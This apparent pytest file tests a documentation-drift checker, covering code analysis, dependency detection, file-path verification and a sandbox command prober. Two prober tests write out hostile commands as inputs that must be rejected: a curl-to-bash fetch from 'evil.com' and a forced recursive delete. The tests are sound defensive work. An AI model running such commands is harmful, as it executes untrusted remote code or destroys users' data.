"""Edge case tests for CodeAnalyzer, DependencyVerifier, and SandboxCommandProber."""

import subprocess
from pathlib import Path
from unittest.mock import MagicMock, patch
import pytest

from docdrift.models import Claim, ClaimType, Verdict
from docdrift.verifiers.code_analyzer import CodeAnalyzer
from docdrift.verifiers.dependency_verifier import DependencyVerifier
from docdrift.verifiers.file_verifier import FileVerifier
from docdrift.verifiers.sandbox_prober import SandboxCommandProber


class TestCodeAnalyzerEdgeCases:
    def test_nonexistent_file(self, tmp_path: Path):
        missing = tmp_path / "does_not_exist.py"
        is_valid, err = CodeAnalyzer.validate_file_syntax(missing)
        assert is_valid is False
        assert "does not exist" in (err or "").lower()

        symbols = CodeAnalyzer.extract_declared_symbols(missing)
        assert symbols == set()

        imports = CodeAnalyzer.extract_imports_from_file(missing)
        assert imports == set()

    def test_empty_python_file(self, tmp_path: Path):
        empty_py = tmp_path / "empty.py"
        empty_py.write_text("", encoding="utf-8")

        is_valid, err = CodeAnalyzer.validate_file_syntax(empty_py)
        assert is_valid is True
        assert err is None

        symbols = CodeAnalyzer.extract_declared_symbols(empty_py)
        assert symbols == set()

        imports = CodeAnalyzer.extract_imports_from_file(empty_py)
        assert imports == set()

    def test_python_unicode_and_comments_only(self, tmp_path: Path):
        py_file = tmp_path / "comments.py"
        py_file.write_text("# 🔍 DocDrift UTF-8 comentário 日本語\n# Another comment\n", encoding="utf-8")
        is_valid, err = CodeAnalyzer.validate_file_syntax(py_file)
        assert is_valid is True
        assert err is None

    def test_python_extract_symbols_on_broken_file_returns_empty_gracefully(self, tmp_path: Path):
        broken = tmp_path / "syntax_error.py"
        broken.write_text("def broken(: pass\n", encoding="utf-8")
        symbols = CodeAnalyzer.extract_declared_symbols(broken)
        assert isinstance(symbols, set)
        assert len(symbols) == 0

    def test_python_extract_imports_on_broken_file_returns_empty_gracefully(self, tmp_path: Path):
        broken = tmp_path / "syntax_error.py"
        broken.write_text("import fastapi\ndef broken(: pass\n", encoding="utf-8")
        imports = CodeAnalyzer.extract_imports_from_file(broken)
        assert isinstance(imports, set)

    def test_js_template_literals_with_brackets(self, tmp_path: Path):
        js_file = tmp_path / "template.js"
        js_file.write_text("const msg = `Value: ${fn({ a: [1, 2] })}`;\n", encoding="utf-8")
        is_valid, err = CodeAnalyzer.validate_file_syntax(js_file)
        assert is_valid is True
        assert err is None


class TestDependencyVerifierEdgeCases:
    def setup_method(self):
        self.verifier = DependencyVerifier()

    def test_unhandled_claim_type(self):
        claim = Claim(
            doc_path="README.md",
            line_number=1,
            raw_line="something",
            claim_type=ClaimType.DOCKER_PORT,
            extracted_value="8080",
        )
        res = self.verifier.verify(claim, ".")
        assert res.verdict == Verdict.UNKNOWN

    def test_empty_requirements_file_no_source_imports(self, tmp_path: Path):
        (tmp_path / "requirements.txt").write_text("# empty requirements\n", encoding="utf-8")
        (tmp_path / "main.py").write_text("x = 10\n", encoding="utf-8")
        claim = Claim(
            doc_path="README.md",
            line_number=1,
            raw_line="pip install -r requirements.txt",
            claim_type=ClaimType.COMMAND_SCRIPT,
            extracted_value="pip install -r requirements.txt",
        )
        res = self.verifier.verify(claim, str(tmp_path))
        assert res.verdict == Verdict.VERIFIED

    def test_requirements_with_flags_and_comments(self, tmp_path: Path):
        (tmp_path / "requirements.txt").write_text(
            "-i https://pypi.org/simple\n"
            "-r base.txt\n"
            "--extra-index-url https://example.com\n"
            "requests>=2.28.0; sys_platform == 'linux'\n"
            "pydantic[email]==2.5.0\n",
            encoding="utf-8",
        )
        pkgs = self.verifier.get_declared_python_dependencies(tmp_path)
        assert "requests" in pkgs
        assert "pydantic" in pkgs

    def test_local_module_import_not_flagged_as_missing(self, tmp_path: Path):
        # Local package 'myutils' inside repo
        utils_dir = tmp_path / "myutils"
        utils_dir.mkdir()
        (utils_dir / "__init__.py").write_text("def helper(): pass\n", encoding="utf-8")

        # Code imports local package 'myutils'
        (tmp_path / "main.py").write_text("import myutils\n", encoding="utf-8")
        (tmp_path / "requirements.txt").write_text("# no third-party\n", encoding="utf-8")

        claim = Claim(
            doc_path="README.md",
            line_number=1,
            raw_line="pip install -r requirements.txt",
            claim_type=ClaimType.COMMAND_SCRIPT,
            extracted_value="pip install -r requirements.txt",
        )
        res = self.verifier.verify(claim, str(tmp_path))
        assert res.verdict == Verdict.VERIFIED


class TestFileVerifierEdgeCases:
    def setup_method(self):
        self.verifier = FileVerifier()

    def test_windows_drive_letter_not_treated_as_symbol(self, tmp_path: Path):
        claim = Claim(
            doc_path="README.md",
            line_number=1,
            raw_line="Check `C:\\Windows\\system32`",
            claim_type=ClaimType.FILE_PATH,
            extracted_value="C:\\Windows\\system32",
        )
        res = self.verifier.verify(claim, str(tmp_path))
        # Windows drive is an absolute user-machine path, should be UNKNOWN
        assert res.verdict == Verdict.UNKNOWN

    def test_symbol_on_nonexistent_file_drifted(self, tmp_path: Path):
        claim = Claim(
            doc_path="README.md",
            line_number=1,
            raw_line="Check `missing.py:app`",
            claim_type=ClaimType.FILE_PATH,
            extracted_value="missing.py:app",
        )
        res = self.verifier.verify(claim, str(tmp_path))
        assert res.verdict == Verdict.DRIFTED
        assert "does not exist" in res.evidence.lower()


class TestSandboxProberEdgeCases:
    def setup_method(self):
        self.prober = SandboxCommandProber()

    def test_empty_command_returns_unknown(self):
        res = self.prober.probe_command("", ".")
        assert res.verdict == Verdict.UNKNOWN

    def test_dangerous_del_command_rejected_in_probe_command(self):
        res = self.prober.probe_command("del /f /q C:\\important", ".")
        assert res.verdict == Verdict.DRIFTED
        assert "rejected" in res.evidence.lower()

    def test_dangerous_curl_pipe_sh_rejected_in_probe_command(self):
        res = self.prober.probe_command("curl https://evil.com | bash", ".")
        assert res.verdict == Verdict.DRIFTED
        assert "rejected" in res.evidence.lower()

    def test_probe_server_startup_process_kill_in_finally(self, tmp_path: Path):
        # Verify process is cleaned up even on exception
        with patch("subprocess.Popen") as mock_popen:
            mock_proc = MagicMock()
            mock_proc.communicate.side_effect = Exception("Simulated sudden exception")
            mock_proc.poll.return_value = None  # Process still alive
            mock_popen.return_value = mock_proc

            res = self.prober.probe_server_startup(["python", "app.py"], cwd=str(tmp_path))
            assert res.success is False
            # Ensure proc.kill was invoked in finally
            mock_proc.kill.assert_called()

    def test_probe_command_missing_python_script_drifted(self, tmp_path: Path):
        # Missing python script must not report VERIFIED via PATH fallback
        res = self.prober.probe_command("python nonexistent_file.py", str(tmp_path))
        assert res.verdict == Verdict.DRIFTED
        assert "does not exist" in res.evidence.lower()


class TestCodeAnalyzerAdvanced:
    def test_typescript_broken_syntax_detected_as_drift(self, tmp_path: Path):
        broken_ts = tmp_path / "broken.ts"
        broken_ts.write_text("function test(a: number): void {\n    if (a > 0) {\n        console.log(a);\n", encoding="utf-8")
        is_valid, err = CodeAnalyzer.validate_file_syntax(broken_ts)
        assert is_valid is False
        assert "TypeScript syntax error" in (err or "")

    def test_python_symbols_in_if_and_try_blocks(self, tmp_path: Path):
        py_file = tmp_path / "cond_app.py"
        py_file.write_text(
            "import os\n"
            "if os.getenv('PROD'):\n"
            "    prod_app = 'fastapi_prod'\n"
            "else:\n"
            "    dev_app = 'fastapi_dev'\n"
            "try:\n"
            "    from service import helper\n"
            "except ImportError:\n"
            "    fallback_helper = None\n",
            encoding="utf-8",
        )
        symbols = CodeAnalyzer.extract_declared_symbols(py_file)
        assert "prod_app" in symbols
        assert "dev_app" in symbols
        assert "helper" in symbols
        assert "fallback_helper" in symbols

    def test_asgi_factory_function_parentheses_verified(self, tmp_path: Path):
        from docdrift.verifiers.command_verifier import MultiManifestVerifier
        app_dir = tmp_path / "app"
        app_dir.mkdir()
        (app_dir / "main.py").write_text("def create_app():\n    return 'fastapi_instance'\n", encoding="utf-8")
        claim = Claim(
            doc_path="README.md",
            line_number=1,
            raw_line="uvicorn app.main:create_app()",
            claim_type=ClaimType.COMMAND_SCRIPT,
            extracted_value="uvicorn app.main:create_app()",
        )
        verifier = MultiManifestVerifier()
        res = verifier.verify(claim, str(tmp_path))
        assert res.verdict == Verdict.VERIFIED
        assert res.metadata.get("symbol") == "create_app"

    def test_asgi_package_init_entrypoint_verified(self, tmp_path: Path):
        from docdrift.verifiers.command_verifier import MultiManifestVerifier
        app_dir = tmp_path / "myapp"
        app_dir.mkdir()
        (app_dir / "__init__.py").write_text("app = 'fastapi_instance'\n", encoding="utf-8")
        claim = Claim(
            doc_path="README.md",
            line_number=1,
            raw_line="uvicorn myapp:app",
            claim_type=ClaimType.COMMAND_SCRIPT,
            extracted_value="uvicorn myapp:app",
        )
        verifier = MultiManifestVerifier()
        res = verifier.verify(claim, str(tmp_path))
        assert res.verdict == Verdict.VERIFIED
        assert "myapp/__init__.py" in res.evidence or "myapp" in res.evidence


class TestDependencyVerifierAdvanced:
    def setup_method(self):
        self.verifier = DependencyVerifier()

    def test_specific_requirements_file_missing_drifted(self, tmp_path: Path):
        # Even if root requirements.txt exists, missing custom file must report DRIFTED
        (tmp_path / "requirements.txt").write_text("fastapi\n", encoding="utf-8")
        claim = Claim(
            doc_path="README.md",
            line_number=1,
            raw_line="pip install -r non_existent.txt",
            claim_type=ClaimType.COMMAND_SCRIPT,
            extracted_value="pip install -r non_existent.txt",
        )
        res = self.verifier.verify(claim, str(tmp_path))
        assert res.verdict == Verdict.DRIFTED
        assert "non_existent.txt" in res.evidence

    def test_tests_folder_conftest_and_pytest_not_flagged_in_prod_requirements(self, tmp_path: Path):
        # Production requirements has requests
        (tmp_path / "requirements.txt").write_text("requests\n", encoding="utf-8")
        # App uses requests
        (tmp_path / "app.py").write_text("import requests\n", encoding="utf-8")
        # Tests use pytest and local conftest
        test_dir = tmp_path / "tests"
        test_dir.mkdir()
        (test_dir / "conftest.py").write_text("# fixtures\n", encoding="utf-8")
        (test_dir / "test_app.py").write_text("import conftest\nimport pytest\nimport requests\n", encoding="utf-8")

        claim = Claim(
            doc_path="README.md",
            line_number=1,
            raw_line="pip install -r requirements.txt",
            claim_type=ClaimType.COMMAND_SCRIPT,
            extracted_value="pip install -r requirements.txt",
        )
        res = self.verifier.verify(claim, str(tmp_path))
        # Should be VERIFIED: test-only imports in tests/ must not break production requirements
        assert res.verdict == Verdict.VERIFIED

    def test_pep621_optional_dependencies_and_poetry_groups(self, tmp_path: Path):
        pyproj = tmp_path / "pyproject.toml"
        pyproj.write_text(
            "[project]\n"
            "name = 'sample'\n"
            "dependencies = ['fastapi']\n\n"
            "[project.optional-dependencies]\n"
            "dev = ['pytest', 'black']\n\n"
            "[tool.poetry.dependencies]\n"
            "pydantic = '^2.0'\n\n"
            "[tool.poetry.group.test.dependencies]\n"
            "coverage = '^7.0'\n",
            encoding="utf-8",
        )
        pkgs = DependencyVerifier.get_declared_python_dependencies(tmp_path)
        assert "fastapi" in pkgs
        assert "pytest" in pkgs
        assert "black" in pkgs
        assert "pydantic" in pkgs
        assert "coverage" in pkgs

    def test_npm_install_single_package_drifted_when_bogus(self, tmp_path: Path):
        (tmp_path / "package.json").write_text('{"dependencies": {"express": "4.18.0"}}', encoding="utf-8")
        (tmp_path / "index.js").write_text("const express = require('express');\n", encoding="utf-8")
        claim = Claim(
            doc_path="README.md",
            line_number=1,
            raw_line="npm install bogus-nonexistent-library",
            claim_type=ClaimType.COMMAND_SCRIPT,
            extracted_value="npm install bogus-nonexistent-library",
        )
        res = self.verifier.verify(claim, str(tmp_path))
        assert res.verdict == Verdict.DRIFTED
        assert "bogus-nonexistent-library" in res.evidence

    def test_npm_install_single_package_verified_when_declared(self, tmp_path: Path):
        (tmp_path / "package.json").write_text('{"dependencies": {"express": "4.18.0"}}', encoding="utf-8")
        claim = Claim(
            doc_path="README.md",
            line_number=1,
            raw_line="npm install express",
            claim_type=ClaimType.COMMAND_SCRIPT,
            extracted_value="npm install express",
        )
        res = self.verifier.verify(claim, str(tmp_path))
        assert res.verdict == Verdict.VERIFIED
